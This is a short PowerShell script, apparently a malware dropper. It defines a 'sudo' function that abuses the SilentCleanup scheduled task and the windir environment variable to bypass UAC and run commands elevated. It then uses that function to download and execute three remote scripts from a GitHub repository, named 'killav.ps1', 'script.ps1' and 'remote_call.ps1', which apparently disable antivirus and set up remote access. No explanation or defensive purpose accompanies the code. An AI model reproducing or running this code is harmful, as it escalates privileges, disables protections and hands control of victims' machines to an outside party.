function sudo {
	$command = "powershell -nop -c " + $args + ";#";

  Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
}

sudo "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/killav.ps1')"
sudo "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/script.ps1')"
sudo "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/remote_call.ps1')"
